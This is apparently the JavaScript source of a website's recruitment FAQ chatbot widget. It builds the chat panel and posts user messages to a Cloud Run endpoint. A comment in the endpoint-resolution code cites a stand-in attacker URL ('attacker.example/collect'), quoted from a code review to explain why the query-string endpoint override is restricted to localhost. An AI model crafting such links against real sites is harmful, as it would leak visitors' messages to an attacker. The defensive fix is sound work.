(function () {
  'use strict';

  // Phase A 採用FAQチャットボット (Vertex AI Gemini backend, chatbot/ 参照)。
  // map-search.js と同じ「末尾script + 専用JSモジュール + DOM自己注入」パターン。
  //
  // エンドポイント解決順: (1) このscriptタグの data-endpoint 属性 → (2) 下記デフォルト定数。
  // デフォルトはまだ実デプロイされていないプレースホルダーであり、Cloud Run へのデプロイ完了後
  // (chatbot/README.md 参照) に data-endpoint 属性で本番URLへ差し替える想定。
  //
  // ローカル確認用の ?chatbot_endpoint= クエリ上書きは localhost/127.0.0.1 でのみ有効
  // (/code-review high で指摘: 本番オリジンで無制限に許可すると、悪意あるURL
  // `?chatbot_endpoint=https://attacker.example/collect` を踏んだ訪問者の入力メッセージが
  // 攻撃者サーバーへ送信されてしまうデータ流出経路になる)。
  var DEFAULT_ENDPOINT = 'https://aozora-chatbot-PENDING-DEPLOY.asia-northeast1.run.app/chat';
  var MAX_HISTORY_TURNS = 6;
  var LOCAL_HOSTNAMES = ['localhost', '127.0.0.1'];

  var currentScript = document.currentScript;

  function resolveEndpoint() {
    if (LOCAL_HOSTNAMES.indexOf(window.location.hostname) !== -1) {
      try {
        var fromQuery = new URLSearchParams(window.location.search).get('chatbot_endpoint');
        if (fromQuery) return fromQuery;
      } catch (e) {
        // URLSearchParams 非対応の古いブラウザ等は無視して次のフォールバックへ。
      }
    }
    if (currentScript && currentScript.getAttribute('data-endpoint')) {
      return currentScript.getAttribute('data-endpoint');
    }
    return DEFAULT_ENDPOINT;
  }

  var ENDPOINT = resolveEndpoint();

  function escapeForLog(str) {
    return String(str).slice(0, 200);
  }

  function el(tag, className, attrs) {
    var node = document.createElement(tag);
    if (className) node.className = className;
    if (attrs) {
      Object.keys(attrs).forEach(function (key) {
        node.setAttribute(key, attrs[key]);
      });
    }
    return node;
  }

  function buildToggleIcon() {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('viewBox', '0 0 24 24');
    svg.setAttribute('fill', 'none');
    svg.setAttribute('aria-hidden', 'true');
    svg.innerHTML =
      '<path d="M4 5.5C4 4.67 4.67 4 5.5 4h13c.83 0 1.5.67 1.5 1.5v10c0 .83-.67 1.5-1.5 1.5H9l-4 4v-4H5.5C4.67 17 4 16.33 4 15.5v-10z" ' +
      'stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/>';
    return svg;
  }

  function buildSendIcon() {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('viewBox', '0 0 24 24');
    svg.setAttribute('fill', 'none');
    svg.setAttribute('aria-hidden', 'true');
    svg.innerHTML =
      '<path d="M4 12l16-7-6.5 16-2.5-6.5L4 12z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round" stroke-linecap="round"/>';
    return svg;
  }

  function init() {
    var root = el('div', 'chat-widget');

    var toggle = el('button', 'chat-widget__toggle', {
      type: 'button',
      'aria-haspopup': 'dialog',
      'aria-expanded': 'false',
      'aria-label': '採用に関する質問チャットを開く',
    });
    toggle.appendChild(buildToggleIcon());

    var panel = el('div', 'chat-widget__panel', {
      role: 'dialog',
      'aria-modal': 'false',
      'aria-label': '採用FAQチャットボット',
    });
    panel.hidden = true;

    var header = el('div', 'chat-widget__header');
    var headerText = el('div');
    var headerTitle = el('p', 'chat-widget__header-title');
    headerTitle.textContent = '採用FAQチャットボット';
    var headerSub = el('p', 'chat-widget__header-sub');
    headerSub.textContent = '求人に関するご質問にお答えします';
    headerText.appendChild(headerTitle);
    headerText.appendChild(headerSub);
    var closeBtn = el('button', 'chat-widget__close', {
      type: 'button',
      'aria-label': 'チャットを閉じる',
    });
    closeBtn.textContent = '×';
    header.appendChild(headerText);
    header.appendChild(closeBtn);

    var messages = el('div', 'chat-widget__messages', {
      'aria-live': 'polite',
      'aria-atomic': 'false',
    });

    var form = el('form', 'chat-widget__form');
    var textarea = el('textarea', 'chat-widget__input', {
      rows: '1',
      placeholder: 'ご質問を入力してください（例：夜勤なしの求人はありますか？）',
      'aria-label': 'メッセージを入力',
      maxlength: '500',
    });
    var sendBtn = el('button', 'chat-widget__send', {
      type: 'submit',
      'aria-label': '送信',
    });
    sendBtn.appendChild(buildSendIcon());
    form.appendChild(textarea);
    form.appendChild(sendBtn);

    panel.appendChild(header);
    panel.appendChild(messages);
    panel.appendChild(form);

    root.appendChild(panel);
    root.appendChild(toggle);
    document.body.appendChild(root);

    var history = []; // [{role: 'user'|'model', content: string}]
    var sending = false;
    var greeted = false;

    function addMessage(text, kind) {
      var bubble = el('div', 'chat-widget__message chat-widget__message--' + kind);
      bubble.textContent = text; // textContent のみ — HTML/Markdown はレンダリングしない (XSS対策)
      messages.appendChild(bubble);
      messages.scrollTop = messages.scrollHeight;
      return bubble;
    }

    function addTypingIndicator() {
      var typing = el('div', 'chat-widget__typing', { 'aria-hidden': 'true' });
      typing.appendChild(document.createElement('span'));
      typing.appendChild(document.createElement('span'));
      typing.appendChild(document.createElement('span'));
      messages.appendChild(typing);
      messages.scrollTop = messages.scrollHeight;
      return typing;
    }

    function openPanel() {
      panel.hidden = false;
      toggle.setAttribute('aria-expanded', 'true');
      if (!greeted) {
        greeted = true;
        addMessage(
          'こんにちは。採用に関するご質問（未経験可否・夜勤の有無・選考期間など）にお答えします。',
          'bot'
        );
      }
      window.requestAnimationFrame(function () {
        textarea.focus();
      });
    }

    function closePanel() {
      panel.hidden = true;
      toggle.setAttribute('aria-expanded', 'false');
    }

    toggle.addEventListener('click', function () {
      if (panel.hidden) openPanel();
      else closePanel();
    });
    closeBtn.addEventListener('click', closePanel);

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && !panel.hidden) {
        closePanel();
        toggle.focus();
      }
    });

    // Enter で送信、Shift+Enter で改行 (map-search.js 同様プレーンJSのみ)。
    textarea.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        form.requestSubmit();
      }
    });

    form.addEventListener('submit', function (e) {
      e.preventDefault();
      if (sending) return;

      var message = textarea.value.trim();
      if (!message) return;

      addMessage(message, 'user');
      textarea.value = '';
      sending = true;
      sendBtn.disabled = true;

      var typing = addTypingIndicator();
      var requestHistory = history.slice(-MAX_HISTORY_TURNS);

      fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: message, history: requestHistory }),
      })
        .then(function (res) {
          typing.remove();
          if (res.status === 429) {
            addMessage(
              'ただいま混み合っています。少し時間をおいて再度お試しください。',
              'error'
            );
            return null;
          }
          if (!res.ok) {
            throw new Error('chat request failed: ' + res.status);
          }
          return res.json();
        })
        .then(function (data) {
          if (!data) return; // 429 等で既にエラー表示済み
          // blocked=true (スコープ外/セーフティ拒否) も定型文として bot 吹き出しで表示する
          // — ユーザー視点では「答えられない」という通常の応答の一種であり、見た目を変える
          // 必要はない (エラー扱いにしない)。
          addMessage(data.reply, 'bot');
          history.push({ role: 'user', content: message });
          history.push({ role: 'model', content: data.reply });
          history = history.slice(-MAX_HISTORY_TURNS);
        })
        .catch(function (err) {
          typing.remove();
          addMessage(
            '通信エラーが発生しました。しばらくしてから再度お試しください。',
            'error'
          );
          if (window.console && window.console.warn) {
            window.console.warn('[chat-widget] request failed:', escapeForLog(err));
          }
        })
        .finally(function () {
          sending = false;
          sendBtn.disabled = false;
        });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
